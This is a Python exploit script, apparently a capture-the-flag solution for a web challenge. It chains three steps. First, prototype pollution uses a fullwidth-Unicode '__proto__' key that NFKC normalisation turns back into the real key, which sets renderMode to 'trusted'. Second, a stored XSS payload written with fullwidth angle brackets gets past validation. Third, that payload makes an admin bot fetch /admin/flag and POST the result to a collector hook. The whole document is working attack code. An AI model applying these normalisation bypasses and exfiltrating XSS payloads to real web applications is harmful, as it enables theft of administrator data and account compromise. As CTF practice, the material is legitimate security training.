#!/usr/bin/env python3
import requests, sys, re, json, time

B = sys.argv[1].rstrip("/")
s = requests.Session()
u = "analyst_m" + str(int(time.time()))
pw = "Sup3rSecret_pw!"

# 1) register analyst
r = s.post(f"{B}/register", data={"username": u, "password": pw}, timeout=20)
print("register:", r.status_code, r.url)

# 2) get collector token from /inbox
inbox = s.get(f"{B}/inbox", timeout=20).text
m = re.search(r"/hooks/([0-9a-f]+)", inbox)
token = m.group(1)
print("collector token:", token)

# 3) prototype pollution via preferences import (NFKC bypass -> __proto__.renderMode='trusted')
proto_key = "＿＿ｐｒｏｔｏ＿＿"  # NFKC -> __proto__
pollution = json.dumps({proto_key: {"renderMode": "trusted"}})
r = s.post(f"{B}/preferences/import", data={"config": pollution}, timeout=20)
print("pollution import:", r.status_code)

# 4) create incident with a SECTION block carrying fullwidth-angle XSS (passes validation,
#    NFKC-normalizes to <script> at render; section has no own renderMode -> inherits 'trusted')
js = ("fetch('/admin/flag').then(function(r){return r.text()})"
      ".then(function(t){fetch('/hooks/" + token + "',{method:'POST',body:t})})")
heading = "＜script＞" + js + "＜/script＞"
timeline = json.dumps([{"type": "section", "text": heading}])
r = s.post(f"{B}/incidents", data={
    "title": "Incident report alpha",
    "summary": "Please review this incident at your earliest convenience.",
    "severity": "high",
    "timeline": timeline,
}, timeout=20, allow_redirects=False)
loc = r.headers.get("Location", "")
print("create incident:", r.status_code, loc)
inc_id = loc.rstrip("/").split("/")[-1]

# 5) submit for review -> admin bot visits & renders -> XSS fires as admin
r = s.post(f"{B}/incidents/{inc_id}/report", timeout=20, allow_redirects=False)
print("submit for review:", r.status_code)

# 6) poll inbox for exfiltrated flag
flag = None
for i in range(25):
    time.sleep(3)
    txt = s.get(f"{B}/inbox", timeout=20).text
    m = re.search(r"Algolymp\{[^}]+\}", txt)
    if m:
        flag = m.group(0); break
    print(f"  poll {i}: no flag yet")
print("FLAG:", flag)
